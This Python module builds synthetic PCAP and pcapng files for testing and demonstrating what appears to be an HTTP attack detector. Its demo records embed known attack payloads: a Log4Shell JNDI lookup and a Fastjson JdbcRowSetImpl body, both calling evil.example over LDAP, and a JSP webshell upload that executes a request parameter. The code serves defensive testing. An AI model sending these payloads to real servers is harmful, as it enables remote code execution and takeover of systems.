"""PCAP 合成器：为单元测试与演示生成确定性流量（零外部依赖）。

为什么自己写而不是用 scapy / tcpreplay：
1. **测试需要确定性**——真实抓包不可复现，回放还得装工具；合成字节流最稳。
2. **演示需要安全**——面试演示不能拿生产流量，必须是"含已知攻击但完全自造"的文件。
3. 手写一遍才会踩到 pcap 的坑（magic 与字节序、snaplen、链路类型、TCP 校验和）。

生成的报文带**正确的 IP/TCP 校验和**，因此 Wireshark 打开不会标红——
演示时可以直接在 Wireshark 里跟面试官逐包看（"这个包是攻击，下一个是正常请求"）。

用法：
    python -m tools.pcapgen out.pcap      # 生成演示 PCAP
"""
from __future__ import annotations

import struct
from pathlib import Path
from socket import inet_aton

_MAGIC_USEC = 0xA1B2C3D4
_MAGIC_NSEC = 0xA1B23C4D


def _checksum(data: bytes) -> int:
    """互联网校验和（RFC 1071）：16 位反码求和后取反。"""
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def _ipv4_header(src: str, dst: str, proto: int, payload_len: int,
                 ip_id: int = 1, ttl: int = 64) -> bytes:
    header = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + payload_len, ip_id,
                         0x4000, ttl, proto, 0, inet_aton(src), inet_aton(dst))
    return header[:10] + struct.pack(">H", _checksum(header)) + header[12:]


def _tcp_segment(src: str, dst: str, sport: int, dport: int, seq: int,
                 payload: bytes, flags: int = 0x18) -> bytes:
    header = struct.pack(">HHIIBBHHH", sport, dport, seq, 0, 5 << 4, flags,
                         65535, 0, 0)
    pseudo = (inet_aton(src) + inet_aton(dst)
              + struct.pack(">BBH", 0, 6, len(header) + len(payload)))
    csum = _checksum(pseudo + header + payload)
    header = header[:16] + struct.pack(">H", csum) + header[18:]
    return header + payload


def _ethernet(payload: bytes) -> bytes:
    return (b"\x02\x00\x00\x00\x00\x01" + b"\x02\x00\x00\x00\x00\x02"
            + struct.pack(">H", 0x0800) + payload)


def tcp_frame(src: str, dst: str, sport: int, dport: int, seq: int,
              payload: bytes) -> bytes:
    """一个完整的 Ethernet + IPv4 + TCP 帧（应用层数据为 payload）。"""
    seg = _tcp_segment(src, dst, sport, dport, seq, payload)
    return _ethernet(_ipv4_header(src, dst, 6, len(seg)) + seg)


def udp_frame(src: str, dst: str, sport: int, dport: int,
              payload: bytes) -> bytes:
    """UDP 帧（演示"非 HTTP 流量不应产生事件"）。"""
    udp = struct.pack(">HHHH", sport, dport, 8 + len(payload), 0) + payload
    return _ethernet(_ipv4_header(src, dst, 17, len(udp)) + udp)


def http_request(method: str, path: str, host: str,
                 headers: dict[str, str] | None = None,
                 body: bytes = b"", ua: str = "Mozilla/5.0") -> bytes:
    """构造一个合法的 HTTP/1.1 请求字节串（Content-Length 自动计算）。"""
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}",
             f"User-Agent: {ua}"]
    for key, value in (headers or {}).items():
        lines.append(f"{key}: {value}")
    if body:
        lines.append(f"Content-Length: {len(body)}")
        lines.append("Content-Type: application/json")
    lines.append("Connection: close")
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


def http_response(status: str = "200 OK", body: bytes = b"") -> bytes:
    head = (f"HTTP/1.1 {status}\r\nContent-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n\r\n").encode()
    return head + body


def demo_records() -> list[tuple[float, bytes]]:
    """演示场景：2 条正常请求 + 3 条已知攻击 + 1 条 DNS 噪音。

    刻意设计的三件事：
    - Fastjson 的 POST body 拆成两个 TCP 段且**乱序到达**（先到后半段），
      用来验证 TCP 重组：不重组就永远匹配不到。
    - 含一条服务端响应流（10.0.0.80 → 10.0.0.12），验证只解析客户端方向。
    - 含一条 UDP 噪音，验证非 HTTP 流量不产生事件。
    """
    records: list[tuple[float, bytes]] = []

    # 1) 正常请求（不应告警）
    records.append((1793797200.0, tcp_frame(
        "10.0.0.12", "10.0.0.80", 51234, 80, 1_000_000,
        http_request("GET", "/api/orders?page=2&size=20", "shop.internal",
                     ua="curl/8.4.0"))))
    records.append((1793797200.200, tcp_frame(
        "10.0.0.12", "10.0.0.80", 51235, 80, 2_000_000,
        http_request("POST", "/api/login", "shop.internal",
                     body=b'{"user":"alice","pass":"x"}'))))

    # 2) 攻击一：Log4Shell 载荷藏在 User-Agent 里（应用可能根本不打日志）
    records.append((1793797201.0, tcp_frame(
        "10.0.0.66", "10.0.0.80", 40001, 80, 3_000_000,
        http_request("GET", "/?x=1", "shop.internal",
                     ua="${jndi:ldap://evil.example:1389/a}"))))

    # 3) 攻击二：Fastjson autoType 的 POST body，拆两段且乱序
    fastjson = http_request(
        "POST", "/api/parse", "api.internal",
        body=b'{"@type":"com.sun.rowset.JdbcRowSetImpl",'
             b'"dataSourceName":"ldap://evil.example:1389/exp",'
             b'"autoCommit":true}')
    half = len(fastjson) // 2
    records.append((1793797201.600, tcp_frame(
        "10.0.0.77", "10.0.0.80", 40002, 80, 4_000_000 + half,
        fastjson[half:])))                      # 后半段先到
    records.append((1793797201.500, tcp_frame(
        "10.0.0.77", "10.0.0.80", 40002, 80, 4_000_000,
        fastjson[:half])))                      # 前半段后到

    # 4) 攻击三：WebShell 落地请求（写入的内容不会出现在应用日志里）
    records.append((1793797202.0, tcp_frame(
        "10.0.0.88", "10.0.0.80", 40003, 80, 5_000_000,
        http_request("POST", "/upload.jsp", "shop.internal",
                     body=b'cmd=<% Runtime.getRuntime().exec('
                          b'request.getParameter("c")); %>'))))

    # 5) 服务端响应流（不应产生事件）
    records.append((1793797202.100, tcp_frame(
        "10.0.0.80", "10.0.0.12", 80, 51234, 7_000_000,
        http_response(body=b'{"code":0}'))))

    # 6) DNS 噪音（UDP，非 HTTP）
    records.append((1793797203.0, udp_frame(
        "10.0.0.12", "8.8.8.8", 53535, 53,
        b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        b"\x07example\x03com\x00\x00\x01\x00\x01")))

    return records


def pcap_bytes(records: list[tuple[float, bytes]], linktype: int = 1,
               endian: str = "<", nano: bool = False) -> bytes:
    """把 (时间戳, 帧) 列表序列化成 PCAP 文件字节。"""
    magic = _MAGIC_NSEC if nano else _MAGIC_USEC
    scale = 1_000_000_000 if nano else 1_000_000
    out = bytearray(struct.pack(endian + "IHHiIII", magic, 2, 4, 0, 0, 65535,
                                linktype))
    for ts, frame in records:
        sec = int(ts)
        frac = int(round((ts - sec) * scale))
        if frac >= scale:
            sec, frac = sec + 1, 0
        out += struct.pack(endian + "IIII", sec, frac, len(frame), len(frame))
        out += frame
    return bytes(out)


def demo_pcap() -> bytes:
    return pcap_bytes(demo_records())


def pcapng_bytes(records: list[tuple[float, bytes]], linktype: int = 1,
                 endian: str = "<", tsresol_exp: int = 6) -> bytes:
    """把 (时间戳, 帧) 列表序列化成 pcapng 文件字节（零依赖）。

    写这个函数不只是为了测试：CIC-IDS2017 现在官方发的就是 pcapng，而
    "能造出这种格式"意味着测试可以覆盖"读回来"这一侧，而不是靠外部工具
    tcpdump 转一道再测——那等于把被测能力的前提交给第三方。

    块结构（每块都以 total_length 收尾，长度含首尾各一个 4 字节长度字段）：
        SHB: type + len + 字节序魔数 + 版本 + section_len + len
        IDB: type + len + linktype + reserved + snaplen + options + len
        EPB: type + len + if_id + ts_high + ts_low + caplen + origlen + data + len
    """
    def block(btype: int, body: bytes) -> bytes:
        body += b"\x00" * ((4 - len(body) % 4) % 4)   # 块体按 4 字节对齐
        total = 12 + len(body)
        return (struct.pack(endian + "II", btype, total) + body
                + struct.pack(endian + "I", total))

    scale = 10 ** tsresol_exp
    out = bytearray()
    out += block(0x0A0D0D0A,
                 struct.pack(endian + "IHHq", 0x1A2B3C4D, 1, 0, -1))
    # if_tsresol 选项：code=9 len=1，值为 10 的负幂次
    tsresol_opt = struct.pack(endian + "HHB", 9, 1, tsresol_exp) + b"\x00" * 3
    idb_options = tsresol_opt + struct.pack(endian + "HH", 0, 0)
    out += block(0x00000001,
                 struct.pack(endian + "HHI", linktype, 0, 65535) + idb_options)

    for ts, frame in records:
        units = int(round(ts * scale))
        out += block(0x00000006,
                     struct.pack(endian + "IIIII", 0, units >> 32,
                                 units & 0xFFFFFFFF, len(frame), len(frame))
                     + frame)
    return bytes(out)


def demo_pcapng() -> bytes:
    return pcapng_bytes(demo_records())


def write_demo(path: str | Path) -> Path:
    p = Path(path)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(demo_pcap())
    return p


if __name__ == "__main__":                   # pragma: no cover
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "traffic_demo.pcap"
    written = write_demo(target)
    print(f"[*] 演示 PCAP 已生成: {written.resolve()} "
          f"（{len(demo_records())} 个包，含 3 条攻击请求）")
